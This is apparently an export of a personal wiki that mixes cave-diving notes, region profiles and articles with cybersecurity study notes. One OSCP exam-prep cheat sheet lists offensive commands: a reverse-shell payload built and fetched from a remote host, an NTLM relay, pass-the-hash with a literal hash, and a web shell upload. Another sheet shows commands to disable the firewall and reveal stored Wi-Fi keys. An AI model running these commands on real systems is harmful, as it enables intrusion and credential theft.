Reference: https://axel-busch.medium.com/how-to-quickly-create-a-3d-model-from-360-underwater-video-in-1h-or-less-b45b1cf29655

Quick Notes

  • Import & split Video
    • **File -> Import -> Video
  • Alignment
    • Tools -> Camera Calibration: Spherical
    • Workflow -> Align Photos (Preselection OFF)

Full Details

What is the best lighting for underwater 360 video? Recommended 360 degree camera settings for photogrammetry:

  • Resolution: Highest resolution.
  • Image Quality: Highest quality.
  • White balance: Manual/fixed, not automatic.
  • Exposure: Automatic (generally).
  • max ISO: 200–400 for small sensors, up to 1600 for 1" or larger.
  • RAW Images: Not needed (generally).
  • Sharpening: Off or ‘soft’.
  • Stabilisation: On.
  • Direction lock: On.

item.title: About
item.description:
Welcome to the Digital Garden of Josh Richards.

This is a working notebook made public: part personal wiki, part field notebook, part archive, and part long-running attempt to connect ideas before they have settled into something polished.

You may be wondering what a digital garden is, or why this not-quite-blog looks like it belongs in the 90s. Maggie Appleton’s article on the history and ethos of digital gardens is a good explanation, but the short version is that this place is meant to grow in public rather than arrive fully finished.

item.title: Akiyoshidai
item.description:
About

From https://tech-diving.jp/akiyoshidai

What is Akiyoshidai? Akiyoshidai is Japan’s largest karst plateau , located in the central and eastern parts of Mine City, Yamaguchi Prefecture. Its limestone distribution covers approximately 93 km², a scale unparalleled anywhere else in Japan.

More than 400 limestone caves have been identified in Akiyoshidai, including Akiyoshido Cave , one of Japan’s three largest limestone caves and a designated special natural monument.

Akiyoshidai is divided into two plateaus, Higashidai and Nishidai, by the Higashikawa River . Higashidai (Akiyoshidai in the narrow sense) was designated a national park (Akiyoshidai National Park) in 1955 and a special natural monument in 1964. In addition, individual caves are registered as natural monuments, and meticulous care is taken in their maintenance and management.

item.title: Algeria
item.description:
About

Algeria features a diverse landscape that includes mountain ranges, vast deserts, and karstic plateaus, making it highly relevant from a speleological and geological perspective.

🪨 Limestone Karst in Algeria

Yes, Algeria has significant limestone karst formations, especially in the northern and northeastern regions of the country. These include:

  • Djurdjura Mountains (part of the Tell Atlas): This region has well-developed karst plateaus with numerous caves and sinkholes, formed in Jurassic and Cretaceous limestones.
  • **Constantine and Setif regions**: Known for complex karst systems and underground hydrology.
  • Tassili n’Ajjer (southeastern Algeria - DO NOT TRAVEL): While primarily known for its sandstone formations and prehistoric rock art, some karst-like erosion features occur in isolated carbonate outcrops.

🕳️ Caves in Algeria

Algeria has extensive cave systems, many of which are of speleological, ecological, or archaeological interest. Notable caves include:

item.title: Allendale East Cave – Soggy Wombats
item.description:
Allendale East Cave

Introduction

Known as the hole in the middle of the road or just ‘the Dale’, Allendale East Cave is a very popular site among the CDAA Cave rated divers in the Mount Gambier region. As it presents itself as a non-complex cave to dive in, the Soggy Wombats Team has been training, developing skills and accumulating experience in this cave since 2019. Although geographically far from the most developed cave systems in the region, ‘the Dale’ has a small ‘tunnel’ at it’s deepest end that has been in most of Australian’s Cave Divers dreams to break into something big. There hasn’t been any breakthrough in this cave in the last 20 years or so, but with the advances in exploration techniques, we might be surprised with what the future will tell us.

item.title: Armenia
item.description:
About

Area of Interest: Vayots Dzor, Syunik, Tavush Moderate to High Cave Potential

  • Large parts of Armenia’s landscape are limestone and dolomite, particularly in the Vayots Dzor, Syunik, and Tavush provinces.
  • Features rugged terrain with karst valleys, dolines, and numerous caves, many of which are still actively being mapped by local and European caving groups.

Known Caves

  • Mozrov Cave, Magili Cave, and Arjeri Cave are significant dry caves.
  • Armenia is known for deep fissure systems and vertical caves — some of which contain seasonal sumps or intermittent water pools.

Cave Diving Status

  • No published records of cave diving expeditions.
  • Numerous karst springs, resurgences, and hydrothermal systems may offer dive potential, particularly at mid-altitudes where the water table is accessible.

Exploration Potential

  • High chance of discovering new phreatic or resurgence caves.
  • Requires satellite scouting and geological mapping to identify high-potential karst spring zones.
  • Local geology and hydrology suggest first-descent opportunities, especially during spring melt (April–June).

item.title: Article - Corra-Lynn
item.description: When I tell people I’ve just met that I’m a cave diver with claustrophobia, I always get a few confused looks followed by an inevitable round of questions along the lines of “Oh, so how do you stop the panic then?”. But when I mention my claustrophobia to people who know me and the kind of cave diving I do, the reaction is generally more like “You are very clearly broken, Josh - what is wrong with your brain?”.

item.title: Article - Crazy Wombat Tunnel
item.description:
Note: This was later edited to <1100 words for publication in Scuba Diver Magazine and published as Article - Unveiling the Crazy Wombat Tunnel

It all started with a simple question: “What the hell is that empty black area?”. Will had just finished several dozen dives in Pines Cave to collect photogrammetry data, and he was just starting the painstaking, months-long process of using Metashape to turn the 10’s of thousands of still images he’d collected into a high resolution 3D model. Eventually, that 3D model would lead to a game-changing map to support new divers experiencing one of the most renowned and frequently dived cave sites in the Mount Gambier region.

item.title: Article - Exploring Japan’s Hidden Rivers
item.description:
Exploring Japan’s Hidden Rivers

An Australian cave diving expedition to the Mine–Akiyoshidai Karst Plateau Geopark
By Josh Richards & Will Passos

Josh Richards and Will Passos walking through a bamboo forest after their first dive in Terayama Cave

The Mine–Akiyoshidai Karst Plateau Geopark in western Japan is famous for its limestone scenery, extensive cave systems and the enormous Akiyoshido tourist cave. However beneath it’s picturesque landscape, the Mine-Akiyoshidai plateau is riddled with submerged passages and an active groundwater system that remains only partially understood.

item.title: Article - Iddlebiddy Cave - Soggy Wombats - DRAFT
item.description:
Introduction

First discovered sometime in the early 1980’s by an enthusiastic band of unqualified local divers, Iddlebiddy Cave was named as a tongue-in-cheek nod to far larger Cocklebiddy Cave on the Nullarbor Plains which is resembles in structure if not in size. The location of Iddlebiddy Cave remained a closely guarded secret for several years, until it was first formally surveyed on 26 November 1988 by Tony Hambling, Frank Homewood and John McCormick on behalf of the Cave Divers Association of Australia.

item.title: Article - Making Sense with MNemo
item.description:
Reference: https://soggywombats.com.au/2024/04/15/making-sense-with-mnemo/

My v1 MNemo with a graphite pencil for note-taking

Like most folks stuck in Melbourne’s lockdown, I didn’t have much to get excited about during 2020. Having finished my cave course in late 2019 and then leaving Mount Gambier under less than ideal circumstances, all I could do was dream about was getting back to explore the caves I was finally qualified to get into. More than just diving and admiring them though, I desperately wanted to get back to try and understand Mount Gambier’s caves - why they’re shaped the way they are, understand how the different rock formations have developed, and (like every new and overly optimistic cave diver) hopefully use all of that to discover something new!

item.title: Article - Unveiling the Crazy Wombat Tunnel
item.description:
Note: This is an edited version of Article - The Crazy Wombat Tunnel reduced to <1100 words for publication in Scuba Diver Magazine

It all started with a simple question: “What the hell is that empty spot?” Will had just wrapped up dozens of dives in Pines Cave to collect photogrammetry data and was now in the painstaking process of turning tens of thousands of still images into a high-resolution 3D model using Agisoft Metashape. Our eventual goal? A game-changing map to support divers exploring one of Mount Gambier’s most renowned cave sites.

item.title: Article - What's Your ppO2
item.description: There’s one thing watched by rebreather divers with greater concern above anything else - your partial pressure of oxygen, aka “ppO2”. No matter how extraordinary it feels breathing warm air with no bubbles, clearing deco far quicker than your open circuit buddies and drifting around gently to the sound of your own breath; it all comes at the cost of knowing the gas in your loop can quickly and easily become toxic if you’re not vigilantly watching your ppO2. If a solenoid sticks open or a manual add valve jams on, the flood of oxygen into the loop can drive your ppO2 over 1.60 and quickly lead to a hyperoxic convulsion that will ruin your whole day. On the flip side we need a ppO2 of about 0.18atm - equivalent to 18% oxygen on the surface - just to maintain regular brain function, and about 0.15 to maintain consciousness. And as I was brutally reminded earlier this year, ppO2 also happens to drop rather rapidly just as you approach the surface when you think the dive is over.

item.title: Azerbaijan
item.description:
About

Moderate Potential Areas of Interest: Talysh and Caucasus Foothills

Geological Context

  • Azerbaijan has extensive limestone outcrops in the Greater Caucasus, Lesser Caucasus, and Talysh Mountains.
  • Karst formations are concentrated in Nakhchivan, Ismailli, and Lankaran areas.

Known Caves

  • Dry caves like Ashabi-Kahf, Karst caves of Gobustan, and others have archaeological and geological significance.
  • Thermal karst springs exist in Nakhchivan and other mountainous zones.

Cave Diving Status

  • No documented cave diving.
  • However, karst springs near Lankaran and Lerik may contain submerged sections suitable for exploration.

Exploration Potential

  • Greater logistical challenges and less existing infrastructure than Armenia.
  • Some springs in south-eastern Azerbaijan (Talysh Range) appear strong enough to support substantial submerged conduits.

item.description:
Original: https://chatgpt.com/share/6860bcff-0360-8006-8c68-65b3e63a1f15

Best Season to Visit

For a first‐time Balkan cave-diving trip, plan for late August through mid-September. By then the long Adriatic-summer dry spell has lowered groundwater levels, stabilised flow at karst springs and siphons, and delivered the year’s clearest visibility; daytime air still sits in the mid-20 °C range, and water in coastal caves hovers around 18–20 °C. Crucially, most regional clubs schedule their larger expeditions and training camps in this window, making it the easiest period to join fieldwork or gain permit support.(scubadiving.guide, rove.me)

item.title: Cheat Sheet - Cryptography
item.description:
Cryptography is the art and science of keeping information secure through the use of mathematical concepts and techniques. Goals of Cryptography - P.A.I.N.

  • Privacy (Confidentiality) keeps data secure from unauthorized parties
  • Authentication is used to confirm the identities of the sender and receiver of data.
  • Integrity ensures a message isn’t altered in transit
  • Non-Repudiation prevents the original sender from denying they were the sender.

Crypto Tools

  • CyberChef
  • RapidTables
  • Cryptii
  • JavaScript Deobfuscator

References

  • [Cryptography Wikibooks - Comprehensive Resource]](https://en.wikibooks.org/wiki/Cryptography)
  • Practical Cryptography - Online Book
  • KhanAcademy - Cryptography
  • Transposition Cipher Solver
  • Cryptanalysis of numerous classical ciphers
  • “Security Level” is the strength of the cryptographic primitive

Terms

  • Plaintext - Information in human-readable form.
  • Ciphertext - Plaintext message that has been encrypted into an unreadable form
  • Encryption - The process of converting plaintext to ciphertext.
  • Decryption - The process of converting ciphertext to plaintext.
  • Cipher - A method of performing encryption or decryption.
  • Key - A parameter specifying how plaintext is converted to ciphertext and vice versa.
  • Caesar Cipher - A type of cipher that shifts the letters in the alphabet by a fixed number.
  • Enigma Cipher - A type of cipher used by Germany in World War II to encrypt messages.

OpenSSL

  • openssl Initializes the OpenSSL program.
  • enc Stands for “encryption.”
  • -pbkdf2 Specifies the encryption key type.
  • -nosalt Specifies that salting will not be applied.
  • -aes-256-cbc Is the name of the cipher used
  • -K KEY Defines the encryption key (“KEY” is the key)
  • -iv INITIAL Defines the initialisation vector (IV) (“INITIAL” is the IV)
  • -P > key_iv.txt Prints the key and IV to “key_iv.txt”
  • Creating a key and IV: openssl enc -pbkdf2 -nosalt -aes-256-cbc -k mypassword -P > key_and_IV.txt
  • Encrypting: openssl enc -pbkdf2 -nosalt -aes-256-cbc -in plaintextmsg.txt -out encodedmsg.txt.enc -base64 -K KEY_HERE -iv IV_HERE
  • Decrypting: openssl enc -pbkdf2 -nosalt -aes-256-cbc -in encodedmsg.txt.enc -d -base64 -K KEY_HERE -iv IV_HERE

Asymmetric Encryption

Symmetric vs Asymmetric Encryption RSA is the asymmetric algorithm standard used around the world. It works by employing the complexity of factoring large numbers. (Wikipedia)

item.title: Cheat Sheet - Networking
item.description:
Network security is the practices and policies used to protect and monitor a computer network’s resources against threats and risks.

Client-server model is a network computing model that defines how resources and services are shared across a network. Uses a “request and response” method of device communication.

Network threats and risks

  • Unauthorized access into networks
  • Denial of service (DoS) attacks
  • Eavesdropping
  • Data modification (eg attacker steals your data & modifies without your knowledge)

Local Area Network (LAN) is a private computer network that connects devices in smaller physical areas like a room or single building, such as a small office or home network.

item.title: Cheat Sheet - OSCP Windows
item.description:
Related: Tags: OSCP

Quick Reference

  • dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\
  • dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\
  • dir /s/b *.txt
  • RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore
  • RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe
  • Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe
  • Compile C#: msbuild projectname.csproj
  • Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe
  • Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
  • Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Port Enumeration (from Kali)

  • HTTP/WebDav (80): cadaver 192.168.
    • Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser
  • Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users
  • SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168.
    • smbclient -U user \\\\192.168.
    • impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c "powershell -enc JABjAGwAaQBlAG4AdA..." (base64 powershell one-liner)
      • Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell
    • Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
  • LDAP (389): sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.
    • Domain Name found (LDAP Search): ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'
    • Use credentials to find admin password ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
      • To Login psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x to login

Impacket

Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx

item.title: Cheatsheet - Windows
item.description:
Task Manager Complete Guide

Free Security Tools

  • Autoruns - Identifying startup processes
  • Process Explorer - Identifying malicious processes on running systems
  • Winitor/PEStudio - Identifying malicious executables
  • Hex Editor - VisualStudio - Windows Hex Editor (requires install)
  • Comodo Firewall - Free software firewall (with paid antivirus option)
  • Bitdefender Antivirus - Free antivirus
  • Bitwarden - Open source password manager

CMD

Commands for Cmd Shell & PowerShell - COMPREHENSIVE Helpful Command Line Commands

Core

  • cd or chdir Change directory (Linux = cd)
  • dir List directory contents (Linux = ls)
  • md or mkdir Create directory (Linux = mkdir)
  • copy Copy file (Linux = cp)
  • move Move (Cut/Paste) files (Linux = mv)
  • clip Copies to Clipboard
  • del or erase Delete files/directories (Linux = rm or shred)
  • rd or rmdir Remove directory if empty (Linux = rm)
  • find Search a file for a specific string (Linux = grep)
  • exit Close CMD (Linux = exit)
  • type Show contents of file (Linux = cat)
  • cls Clear screen
  • findstr Find string
  • clip - Add to clipboard

Environment Variables

  • set Shows all PC Environment Variables
  • %CD% Current Directory
  • %DATE% Current Date
  • %OS% Windows
  • %ProgramFiles% C:\Program Files
  • %ProgramFiles(x86)% C:\Program Files (x86)
  • %TIME% Current Time
  • %USERPROFILE% C:\Users{username}
  • %SYSTEMDRIVE% C:\
  • %SYSTEMROOT% C:\Windows

Network

  • ipconfig IP Config (Options: /all /release /renew /displaydns /flushdns)
  • getmac MAC Info (Options: /v)
  • netsh
    • netsh wlan show wlanreport
    • netsh interface show interface
    • netsh interface ip show address
    • netsh advfirewall set allprofiles state off Turn off Windows defender
  • ping ping website.address
    • Options: -t (continuous pinging)
  • fping ping multiple ip addresses at once
    • Options: -g (ping all IPs in the following range)
  • tracert “trace route”
    • Options: -d (no domain names)
  • netstat (Options: -o to list PIDs, -e -t 5 to show sent/recieved stats every 5 seconds)
  • route print [computer routing table] (add to add specific route, delete)
  • netsh wlan show profile wifiname key=clear Show saved wifi password
  • nslookup
    • nslookup -type=ptr networkname.com

System Management

  • systeminfo Provides system information
  • driverquery List all drivers (even drivers not in device manager)
  • powercfg (Option required: /energy /batteryreport)
  • assoc File associations
    • eg. assoc .mp4=vlc (Set .mp4 association to VLC)
  • chkdsk Check disk
    • Options /f (error search & fix) /r (check physical sectors)
  • sfc System file check
    • Options /scannow
  • DISM Deployment Image Servicing and Management
    • Options: /Online /Cleanup-Image /CheckHealth OR /ScanHealth OR /RestoreHealth
  • cipher Wipe empty disk space and encrypts files
  • tasklist List tasks
    • tasklist | findstring script To find “script”
  • taskkill Kill task
    • taskkill /f /pid## /f to force /pid to identify process by id#
  • shutdown
    • shutdown /r /fw /f /t 0 (reboot into BIOS)
  • wmic Windows Management Instrumentation Command-Line (Process management)
    • wmic is being replaced with Powershell
    • wmic Starts interactive mode (shell-like), commas used for multiple properties
    • Input format: wmic [global switches] [alias] [verbs] [properties]
      • eg. wmic /APPEND:report.txt logicaldisk get caption, filesystem, freespace

About

Go in dry season: May to November

  • Red crab migration: Oct to December
  • Whale Sharks: November to January Speak to Kat (Matt’s partner) - look at her PhD research

Caves

Whip Cave? Runaway Cave?

Lost Lake Cave

  • Location: Western plateau, inland from Flying Fish Cove
  • Type: Partially flooded limestone cave
  • Details: Known to contain an underground lake with significant depth. The full extent of the submerged section has never been explored, but it is considered one of the most promising inland sites for potential cave diving.
  • Exploration Status: Dry portions mapped; no documented dive attempts.

Daniel Roux Cave

  • Location: Near the eastern coast, northeast of South Point
  • Type: Dry limestone cave with multiple chambers
  • Details: While primarily dry, reports mention water seepage and active flow in the wet season. Potential exists for deeper sections to be partially flooded.
  • Exploration Status: Surveyed, but no recorded underwater exploration.

The Dales

  • Location: Western coast, near Hugh’s Dale Waterfall
  • Type: Karst spring and stream system
  • Details: Features spring-fed water emerging from the base of limestone cliffs. The area around Hugh’s Dale and Anderson Dale may be connected to subterranean water systems—possible resurgence cave diving target.
  • Exploration Status: Surface features documented; no known underwater exploration.

Hosnies Spring Cave

  • Location: North coast, near Hosnies Spring
  • Type: Coastal karst feature with permanent spring
  • Details: This area features a freshwater spring discharging into a brackish mangrove environment, suggesting a potential coastal cave system or resurgence beneath.
  • Exploration Status: Caves reported nearby but not explored underwater.

Waterfall Cave / Runoff Sites (Unnamed)

  • Location: North-west coast cliffs between Martin Point and Ethel Beach
  • Type: Sea caves and freshwater outflows
  • Details: Rainfall channels sometimes discharge clear freshwater through cliffs, indicating potential connections to karst drainage systems that could be explored from the sea side via cave diving.
  • Exploration Status: Not documented or surveyed for cave access, but satellite imagery shows several sea-level notches.

Dolly Beach & Greta Beach Karst System

  • Location: South-east coast
  • Type: Cliff-edge karst with marine influence
  • Details: Both beaches are bordered by steep limestone with visible dissolution features. No documented caves, but the geological setting is favourable for sea cave development, possibly with partially submerged access.
  • Exploration Status: No known surveys, but suitable for scouting.

item.title: CISSP - 1 - Security & Risk Management
item.description:
Reference: https://cissprep.net/domain-1-security-and-risk-management/

Import and Export Controls

  • Wassenaar Arrangement
    • 42 countries agreeing not to distribute weapons & cryptographic tools
    • Some states have outright bans on the import of cryptographic technologies (often about preventing challenges to government authority)

Program Effectiveness Evaluation

  • Due care requires effective education, training, and awareness for employees
  • Due diligence requires evaluation of the effectiveness of that training
  • Ask the right questions: Purpose of an awareness program is to enable and empower all organisation members to achieve safer, more secure and more compliant actions when using information
    • Do your workers have the tools, processes, and procedures to do this?
    • Do they know how to use then effectively
    • Do they have the resource have have what they need to deal with the unexpected
  • User Participation
    • List of training outcomes, then test participants, audits, spot checks
  • Social Engineering response
    • Mock attack attempts to determine if personnel respond appropriately
  • Log Reviews
    • Review user activity to determine if it’s compliant with policies

Education, Training, and Awareness

item.title: CISSP - Misc Notes
item.description:
The Payment Card Industry Data Security Standard (PCI-DSS) has 12 main requirements. Each requirement has additional sub-controls.

  1. Install and maintain a firewall configuration to protect cardholder data
  2. Do not use vendor-supplied defaults for system passwords and other security parameters
  3. Protect stored cardholder data
  4. Encrypt transmission of cardholder data across open, public networks
  5. Use and regularly update anti-virus software or programs
  6. Develop and maintain secure systems and applications
  7. Restrict access to cardholder data by business need-to-know
  8. Assign a unique ID to each person with computer access
  9. Restrict physical access to cardholder data
  10. Track and monitor all access to network resources and cardholder data
  11. Regularly test security systems and processes
  12. Maintain a policy that addresses information security for employees and contractors

Internet Protocol Security (IPsec) is a suite of protocols that provides protection at the network layer of the Open System Interconnection (OSI) model. IPsec is frequently used to establish a Virtual Private Network (VPN) between two routers. IPsec protects the original IP packet by encrypting or hashing the IP packet and adding a new Authentication Header (AH) or Encapsulating Security Payload (ESP) header with a new IP header.

item.title: CRISC
item.description:
Certified in Risk and Information Systems Control

Focus: Specialises in enterprise IT risk management and control. Ideal for those identifying, assessing and mitigating information systems risks.

Industry: Suits industries with strong risk management requirements like insurance, fintech, healthcare and government institutions.

Requirements

Requirements for CRISC certification - Pass the CRISC Exam (US$575 ISACA Member, US$760 Non-member) - Format: 150 multiple-choice questions, scaled score of >450 out of 800 to pass. - Duration: 4 hours. - **Content: - Governance (26%): IT risk governance, frameworks, policies, and organizational structures. - IT Risk Assessment (20%): Risk identification, evaluation, and analysis. - Risk Response and Reporting (32%): Mitigating risk, implementing controls, and communicating results. - Information Technology and Security (22%): Supporting risk management through IT controls and solutions. - Relevant Work Experience - At least three years of cumulative, professional-level work experience in at least two of the four CRISC domains. - At least one year of experience in either IT Risk Identification or IT Risk Assessment - Experience must be verified and within the 10 years preceding the certification application or within five years after passing the exam.

item.title: Cyber - Job Domains & Interview Prep
item.description:
Job Domains

  • Security Architecture - Security design that addresses the requirements and potential risks of a given scenario or environment.
  • Physical Security - Protection of personnel, hardware, software, networks, and data from physical actions and events that could cause serious loss or damage.
  • Risk Assessment - Analysing what can go wrong, how likely it is to happen, what the potential consequences are, and how tolerable the identified risk is.
  • Security Operation - Process of identifying, containing, and remediating threats on behalf of a company or organization.
  • Threat Intelligence - Research and analysis of evidence-based knowledge regarding an existing or emerging menace.
  • User Education - Teaching users how to protect themselves from cyberattacks by informing them of risks, exploits, and external threats, and the skills needed to combat common attacks.
  • Career Development - Training of future cyber security professionals
  • Governance - Framework for managing performance and risk, oversight of compliance and control responsibilities, and defining the cyber mission by mapping the structure, authority, and processes to create an effective program.
  • Framework and Standard - Creation of new security frameworks and practices for professionals to follow.

Interview Prep

Preparing for a Security Engineering Interview

item.title: Cyber Glossary
item.description:
• Basic Service Set Identifier (BSSID): Used by a router to announce its MAC address in a beacon signal.
  • Brute force attack: An attack that involves trying all possible authentication combinations to find a match.
  • CIA Triad: Confidentiality, Integrity and Availability
    • Confidentiality: Ensuring sensitive information is protected from access by unauthorized persons.
    • Integrity: Protecting information from being modified or tampered by unauthorized persons.
    • Availability: Ensuring that all operating systems, equipment, and data are functioning correctly and accessible by those who need it.
  • Code injection: Type of attack that injects code that is then interpreted and executed by the target application.
  • Cybersecurity: The assessment of threats and mitigation of risk
  • Dorking: Aka Google Hacking, using custom google queries to find security holes in websites and code
  • Enumeration The process of gathering data for a specific network, usually for the purpose of finding ways to gain access into that network.
  • Keylogger: A program designed to record which keys are pressed on your computer keyboard. It can obtain passwords or encryption keys and use these to bypass security measures.
  • Internet Control Message Protocol (ICMP) Network layer protocol used by devices to diagnose network communication issues. A ping uses ICMP to send an echo request to a specific IP address and waits on a reply
  • Malware: Hardware, software, or firmware meant to perform an unauthorized process that will compromise the confidentiality, integrity, or availability of a system (e.g., a virus, worm, Trojan horse, or other code-based entity that infects a host).
  • Man-in-middle attack (MitM): An attack where the adversary positions themself between the user and the system so that they can intercept and alter data traveling between them.
  • Packet sniffer: Software that monitors network traffic on wired or wireless networks and captures packets. Packet sniffers are used by network managers to monitor and analyze traffic, but hackers also use them.
  • Ping (Packet Inter-Network Groper): Utility used to determine whether a host is operating and responding to echo requests.
  • Phishing attack: A technique for attempting to acquire sensitive data, such as credit card numbers, usernames, or passwords, through fraudulent solicitation (e.g., email). The perpetrator pretends to be a reputable business or person.
  • Risk: Possibility of losing something valuable
  • Risk analysis: Understanding the risks faced by an organization, which are most severe, and which are most likely.
  • Risk Management: Using the results of risk analysis to create a plan for preventing likely risks.
  • Risk mitigation: The process of reducing the impact of a negative event, and/or the likelihood that it will reoccur.
  • Routing: The act of choosing the path that traffic takes in or across networks.
  • Social engineering: The act of deceiving an individual into revealing sensitive information, obtaining unauthorized access, or committing fraud by gaining confidence and trust.
  • Threat: An actor that might exploit a vulnerability
  • Threat assessment: A structured process of identifying the risks posed to a group or system.
  • Threat Modelling: Determining which attacks an organization is most likely to experience, who is most likely to launch them, and what actions can be done to prevent them.
  • Vulnerability: is an aspect of a business that can be exploited to compromise a system’s CIA Triad
  • Wireless Access Point (WAP): Networking hardware device that connects a wireless network to a wired network.
  • WiFi: The type of wireless technology that uses radio waves to provide wireless internet and network connections.

item.description:
Reference: https://www.youtube.com/watch?v=_t9R1AnB7ho

Note-taking

Understanding and remembering more Combining ideas for more creative ideas

Two steps

  • Literature notes - Things that stood out or interested you (in your own words)

    • Punchy quotes, how you felt,
    • Write in your own words
      • Forces you to think - properly process your thoughts
      • Check yourself - Do you really get it? Do you know what you feel about it? Can you explain it in your own words? Do you get the main idea?

item.title: Epochalypse
item.description:
On 19 January 2038 at 03:14:07 UTC implementations relying on 32-bit signed integer representations of Unix epoch time will overflow, resulting in a system time of 20:45:52 UTC on 13 December 1901

Time Security SIG - The Time Security SIG exists to help the global FIRST community prepare for the 2036–2038 epoch rollovers. By coordinating research, testing, and outreach on time integrity, the SIG connects CSIRTs, vendors, and standards bodies to strengthen resilience across critical infrastructure. Our goal: ensure the world’s clocks keep running — securely — long past 2038.

item.title: Goa Lalauwi
item.description:
About

From Anita: - This is a cave that deserves a special mention. A 600m submerged tunnel leads into the heart of the cave. So far around 3km of tunnels have been explored, yet the cave keeps on going. Goa Lalauwi keeps a few secrets up its sleeve as it wants you to come back for more. On my first dive we swam through big tunnels with white limestone, sections of fractured rock and large areas of stalagmites in crystal clear blue water. To get to the water you walk over 100 steps down a dry chamber which means the cave it self is never exposed to any sunlight. It’s pitch black. This means you are reliant on your torch as soon as you step into the cave. It is quite slippery at the entrance lake and you need to take care not to slip and fall. Then you kit up inside the lake aided by your torch light before the descent towards the first tunnel. The second dive in this beauty was far more complex from a navigational perspective with lots of directional decisions and several jumps that lead to a section with little white humps in the form of witches’ hats. According to our guide, these formations are considered quite rare and, unlike the other speleothems in the caves, form under water. While I have spent several hours in this cave, I will be back for more.

“The House Cave” for Kadena Glamping Muna

  • From Anita:
    • “In the backyard of where we stayed lies Goa La Pahia, the hidden cave, with an unassuming small rock entrance surrounded by vegetation. As you descend, it slowly unveils its secrets. Calcite crystal formations decorate the ceiling. which tum into whole sections covered in crystal straws. As you swim further along the cave it reveals more and more of its unique formations. Small but impressive, it has a special place in my heart. The first underwater crystal cave that I have ever seen was a dream come true. The sheer beauty, uniqueness and the masses of speleothems took a while to sink in. I was on such a high, but at the same time I was so calm and close to a meditative state as I took in the surroundings with awe and wonder. This was my introduction to cave diving in Muna Island. What a phenomenal start that made me curious for what lay in store for the coming days.”

It doesn’t roar. It doesn’t warn. It just walks up to apex predators and throws hands like life owes it a debt.

item.title: Iceland
item.description:
Iceland is listed under Europe in Cave Regions.

Cave Regions

  • No local cave regions listed yet.

Caves & Dive Sites

  • See the linked cave regions above.

Backlinks

  • Cave Regions
  • Diving

Existing Notes

About

Go June to September? (Summer)

  • Calmest Weather & Longest Days:
    Iceland experiences milder weather, longer daylight hours (up to 24 hours near the solstice), and calmer surface conditions during summer. This makes logistics easier and safer, particularly when accessing remote dive sites.
  • Better Accessibility:
    Many of Iceland’s cave dive sites are in remote highland regions or near lava fields — during winter and spring, snow and ice can make these areas impassable. Roads are generally fully open by mid-June and remain accessible until early autumn.
  • Consistent Water Temperatures:
    Iceland’s groundwater-fed cave systems (like those at Silfra and Davíðsgjá) maintain constant temperatures year-round (~2–4°C), so water temps aren’t your limiting factor — surface conditions and access are.
  1. Silfra Fissure (Þingvellir National Park)
    • While not a cave in the traditional sense, Silfra offers crystal-clear visibility (~100m) in a tectonic fissure between the North American and Eurasian plates.
    • Accessible year-round, but summer offers the best overall experience due to comfort during gear changes and travel ease.
  2. Davíðsgjá
    • A darker, slightly deeper alternative to Silfra with limited overhead sections.
    • Best dived in summer for similar reasons — ease of access and surface comfort.
  3. Litlaá Lava Tube Cave Systems (near Lake Mývatn)
    • Actual underwater lava tube systems, rare and remote.
    • These are less developed for tourism and require expedition-level planning.
    • Only realistically accessible between July and early September.

Avoid October to May

item.title: Kayaking - Glenelg River Canoe Trail
item.description:
3-Day Trip from Nelson (ChatGPT)

Why Nelson works

  • Legitimate, commonly used longer-term parking (town, campground, hire operators)
  • You can paddle upriver into the gorge country, camp progressively, then return
  • No tidal commitment unless you deliberately enter the estuary
  • No shuttle, no mid-trip road access required
  • Your car is waiting where food, fuel, and reception exist

The alternative (parking at Dartmoor) is workable, but Nelson gives you better scenery density per kilometre and more flexibility if weather turns.

item.title: Kenya
item.description:
About

Kenya features both limestone karst landscapes and opportunities for cave diving, particularly along its coastal regions.

🪨 Limestone Karst in Kenya

Kenya’s coastal areas, notably around Vipingo in Kilifi County, are characterized by coralline limestone formations that have undergone karstification. These processes have led to the development of features such as caves, sinkholes, and underground voids. For instance, studies at the Vipingo Coral Limestone Quarry have documented various karst features and associated geohazards, including cavities and fissures in the rock mass. (ej-geo.org)

item.title: Kosovo
item.description:
About

Kosovo, despite its small size, has a high concentration of karst terrain, especially in the western and southern parts of the country. This has resulted in a dense network of caves, some of which are significant in size, depth, and scientific interest. While dry caving is relatively well developed, cave diving in Kosovo remains largely unexplored—but there is real potential for pioneering dives, particularly in karst springs and resurgences.

item.title: Mini Essay - 'Surely You're Joking Mr Feynmann' (Richard Feynman)
item.description:
During your walk this morning you finished “Surely Your Joking Mr Feynman”, and it’s been an interesting audiobook to listen to.

When I first started it, I was utterly convinced that it was absolutely brilliant - that Feynman was really connecting with that passion for the universe that I crave, that he had plenty of character and quirks that made him an engaging personality who genuinely loved learning about the universe. I’m sure that’s all true, but the further into the book I got the less I liked him - the whole thing started to feel like a collection of little stories from his life that didn’t build or develop into anything. Just snippets of experience and fun “cocktail event” type stories.

item.title: Mini Essay - Appeal of a dark, empty forest outpost
item.description:
